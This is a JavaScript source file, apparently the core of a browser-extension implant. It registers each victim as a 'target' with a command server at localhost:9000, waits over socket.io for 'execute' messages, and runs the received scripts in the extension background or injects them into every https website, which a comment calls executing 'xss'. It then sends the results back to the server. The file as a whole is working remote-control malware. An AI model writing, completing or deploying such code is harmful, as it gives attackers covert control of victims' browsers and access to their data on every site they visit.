async function registerTarget(profile) {
  const response = await fetch("http://localhost:9000/targets", {
    method: "POST",
    headers: {
      "Content-type": "application/json"
    },
    body: JSON.stringify(profile)
  });
  if (response.ok) {
    const body = await response.json();
    return body;
  } else {
    console.error(response);
  }
}

function initSocket(targetId) {
  const socket = io("http://localhost:9000/", {
    query: {
      targetId
    }
  });

  socket.on("execute", async message => {
    console.log("execute event fired, received:");
    console.log(message);
    const results = await handleExecuteMessage(message);
    console.log(`Got back results for ${message.executionId}`);
    console.log(results);
    socket.emit("execution finish", {
      executionId: message.executionId,
      targetId: targetId,
      result: {
        status: "ok",
        data: results
      }
    });
  });

  return socket;
}

// This is the main method to execute xss from message
async function handleExecuteMessage(message) {
  console.log("execute event fired, received:");
  console.log(message);

  if (message.payload && message.payload.script && message.payload.type) {
    const { type, script } = message.payload;
    const runner = new CommandExecutor();
    if (type === "background") {
      return runner.runInBackgroundScript(script);
    } else if (type === "content") {
      let urls = message.payload.urls;
      if (!urls) {
        urls = ["https://*/*"];
      }
      return await runner.runContentScriptOnWebsites(urls, script);
    }
  } else {
    console.error("Malformed execute message");
    console.error(message);
  }
}
